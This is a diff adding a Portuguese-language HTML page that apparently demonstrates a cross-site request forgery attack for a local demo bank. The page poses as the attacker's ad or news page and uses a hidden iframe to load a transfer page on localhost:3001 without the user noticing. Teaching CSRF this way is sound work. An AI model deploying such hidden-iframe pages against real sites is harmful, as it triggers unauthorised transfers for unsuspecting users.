@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banco Pagina de CSRF</title>
+</head>
+<body>
+        <h2><center>Uma Pagina de publicidade ou noticia ou etc que é feito pelo atacante</center></h2>
+        <h2><center>Atraves de iframe vai enviar o pedido de transferencia, sem o utilizador der conta</center></h2>
+        <center><img src="./imgs/emo.jpg" width=500 height=500></center>
+  
+        <iframe
+    style="display:none"
+    src="http://localhost:3001/bank-transfer.html"
+  >
+  </iframe>
+  
+</body>
+</html>
